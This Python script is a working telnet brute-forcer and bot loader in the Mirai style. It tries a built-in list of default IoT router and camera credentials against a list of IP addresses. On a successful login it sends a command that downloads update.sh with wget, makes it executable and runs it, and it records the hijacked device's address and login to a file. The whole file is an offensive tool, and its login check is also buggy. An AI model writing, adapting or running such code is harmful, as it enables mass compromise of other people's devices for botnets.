#!/usr/bin/python
import threading
import sys, os, re, time, socket
from Queue import *
from sys import stdout

if len(sys.argv) < 4:
    print "Usage: python "+sys.argv[0]+" <list> <threads> <output file>"
    sys.exit()

combo = [ 
        "root:root",
        "root:",
        "admin:admin",
        "support:support",
        "user:user",
        "admin:",
        "admin:password",
        "root:vizxv",
        "root:admin",
        "root:xc3511",
        "root:888888",
        "root:xmhdipc",
        "root:default",
        "root:juantech",
        "root:123456",
        "root:54321",
        "root:12345",
        "root:pass",
        "ubnt:ubnt",
        "root:klv1234",
        "root:Zte521",
        "root:hi3518",
        "root:jvbzd",
        "root:anko",
        "root:zlxx.",
        "root:7ujMko0vizxv",
        "root:7ujMko0admin",
        "root:system",
        "root:ikwb",
        "root:dreambox",
        "root:user",
        "root:realtek",
        "root:00000000",
        "admin:1111111",
        "admin:1234",
        "admin:12345",
        "admin:54321",
        "admin:123456",
        "admin:7ujMko0admin",
        "admin:1234",
        "admin:pass",
        "admin:meinsm",
        "admin:admin1234",
        "root:1111",
        "admin:smcadmin",
        "admin:1111",
        "root:666666",
        "root:password",
        "root:1234",
        "root:klv123",
        "Administrator:admin",
        "service:service",
        "supervisor:supervisor",
        "guest:guest",
        "guest:12345",
        "guest:12345",
        "admin1:password",
        "administrator:1234",
        "666666:666666",
        "888888:888888",
        "tech:tech",
        "mother:fucker"
]

ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

for ip in ips:
    queue_count += 1
    stdout.write("\r[%d] Added to queue" % queue_count)
    stdout.flush()
    queue.put(ip)
print "\n"


class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
        self.rekdevice="cd /tmp; wget http://0.0.0.0/update.sh; busybox wget http://0.0.0.0/update.sh; chmod 777 update.sh; sh update.sh; rm -f update.sh" #command to send
    def run(self):
        global fh
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password=""
            else:
                password=passwd.split(":")[1]
            if "n/a:" in passwd:
                username=""
            else:
                username=passwd.split(":")[0]
            try:
                tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tn.settimeout(0.37)
                tn.connect((self.ip,23))
            except Exception:
                tn.close()
                break
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send(username + "\r\n")
                    time.sleep(0.1)
            except Exception:
                tn.close()
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send(password + "\r\n")
                    time.sleep(0.1)
                else:
                    pass
            except Exception:
                tn.close()
            try:
                prompt = ''
                prompt += tn.recv(40960)
                if "#" in prompt or "$":
                    success = True              
                else:
                    tn.close()
                if success == True:
                    try:
                        tn.send(self.rekdevice + "\r\n")
                        fh.write(self.ip + ":23 " + username + ":" + password + "\n") # 1.1.1.1:23 user:pass # mirai
                        fh.flush()
                        print "[+] GOTCHA -> %s:%s:%s"%(username, password, self.ip)
                        tn.close()
                        break
                    except:
                        tn.close()
                else:
                    tn.close()
            except Exception:
                tn.close()

def readUntil(tn, string, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.01)
        if string in buf: return buf
    raise Exception('TIMEOUT!')

def worker():
    try:
        while True:
            try:
                IP = queue.get()
                thread = router(IP)
                thread.start()
                queue.task_done()
                time.sleep(0.02)
            except:
                pass
    except:
        pass

global fh
fh = open("workingtelnet.txt","a")
for l in xrange(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass